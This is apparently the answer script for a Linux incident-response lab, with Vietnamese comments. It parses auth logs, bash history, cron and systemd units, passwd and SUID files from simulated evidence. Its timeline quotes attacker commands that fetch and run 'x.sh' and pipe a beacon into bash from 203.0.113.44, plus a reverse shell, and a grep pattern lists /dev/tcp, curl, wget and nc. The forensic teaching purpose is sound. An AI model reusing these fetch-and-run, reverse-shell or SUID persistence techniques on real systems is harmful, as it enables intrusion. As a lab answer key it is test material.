#!/usr/bin/env bash
# Lab 5.1 - script giai: phan tich cay artifact Linux, lan ra IP tan cong,
# backdoor va thoi diem compromise. Dung cac lenh dung trong bai hoc.
#
# Dung: bash solve.sh [thu_muc_evidence]   (mac dinh ./evidence)
set -u
E="${1:-evidence}"

line(){ printf '\n==== %s ====\n' "$1"; }

if [ ! -d "$E" ]; then
  echo "Khong thay thu muc evidence: $E (chay make_artifacts.py truoc)"; exit 1
fi

line "1. Top IP co nhieu Failed password nhat (nghi brute force)"
grep "Failed password" "$E/var/log/auth.log" \
  | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn | head

line "2. Cac login THANH CONG (Accepted) va phien mo that (session opened)"
grep -E "Accepted|session opened for user" "$E/var/log/auth.log"

line "3. Leo thang quyen (sudo / su / useradd)"
grep -E "sudo:|su\[|useradd" "$E/var/log/auth.log"

line "4. Lich su lenh cua account bi chiem (deploy)"
cat "$E/home/deploy/.bash_history"
echo "--- root/.bash_history (kiem symlink anti-forensic) ---"
ls -la "$E/root/.bash_history" 2>/dev/null

line "5. Persistence qua cron (drop-in trong /etc/cron.d)"
for f in "$E"/etc/cron.d/*; do
  echo "# $f"; cat "$f"
done

line "6. Persistence qua systemd (ExecStart tro toi mang/shell la)"
grep -rnE "ExecStart=.*(/dev/tcp/|/tmp/|/dev/shm/|base64|curl|wget|nc )" \
  "$E/etc/systemd/system/" 2>/dev/null
echo "--- Timer di kem ---"
for t in "$E"/etc/systemd/system/*.timer; do
  [ -e "$t" ] || continue; echo "# $t"; grep -E "OnUnitActiveSec|Unit=" "$t"
done

line "7. Account UID 0 (chi nen co root) va account co shell dang nhap"
echo "UID 0:"; awk -F: '$3==0 {print "  "$1" (shell "$7")"}' "$E/etc/passwd"
echo "Co login shell:"; grep -E "/(bash|sh|zsh)$" "$E/etc/passwd" | awk -F: '{print "  "$1" -> "$7}'

line "8. SUID binary va bai tap ket (/tmp, /dev/shm)"
echo "SUID binary tim thay:"
find "$E" -perm -4000 -type f 2>/dev/null | while read -r f; do
  echo "  $f"
done
suid="$E/tmp/.cache/sh"
if [ -f "$suid" ]; then
  if [ -u "$suid" ]; then
    echo "  [xac nhan] $suid co bit SUID"
  else
    echo "  [chu y] $suid khong con bit SUID (fs khong giu SUID - xem README)"
  fi
  echo "--- stat (so sanh mtime/ctime cho timeline) ---"
  stat "$suid" 2>/dev/null | grep -E "Modify|Change|Access" || true
fi
echo "--- Noi dung /dev/shm (staging) ---"
ls -la "$E/dev/shm" 2>/dev/null

line "9. Timeline dung lai tu cac artifact"
cat <<'TL'
  14:21:03  auth.log   Bat dau brute force SSH tu 203.0.113.44 (hang loat Failed/Invalid user)
  14:23:11  auth.log   Accepted password for deploy tu 203.0.113.44 -> MOC COMPROMISE
  14:23:11  auth.log   session opened for user deploy (phien that su mo)
  ~sau do   bash_hist  deploy: wget http://203.0.113.44/x.sh; chmod +x; ./x.sh; cp /bin/bash /tmp/.cache/sh
  14:24:02  auth.log   deploy sudo /bin/su -> leo len root
  14:25:40  auth.log   Tao account backdoor "backup" UID=0
  (persist)  systemd   mysqld-backup.service reverse shell -> 203.0.113.44:4444, timer moi 10 phut
  (persist)  cron.d    apache-backup: curl http://203.0.113.44/beacon | bash moi 15 phut
  (privesc)  fs        /tmp/.cache/sh dat bit SUID (chu root)
  (evasion)  fs        root/.bash_history -> /dev/null (xoa dau go lenh)
TL

line "KET LUAN"
cat <<'K'
  IP tan cong      : 203.0.113.44 (brute force -> vao duoc account deploy)
  Thoi diem vao    : Oct 5 14:23:11 (Accepted password + session opened)
  Account backdoor : backup (UID 0 gia danh), tao luc 14:25:40
  Persistence      : systemd mysqld-backup.service/.timer (reverse shell :4444)
                     cron.d apache-backup (curl|bash moi 15 phut)
  Privesc artifact : /tmp/.cache/sh (SUID root)
  Anti-forensic    : root/.bash_history symlink toi /dev/null, deploy chay history -c
K
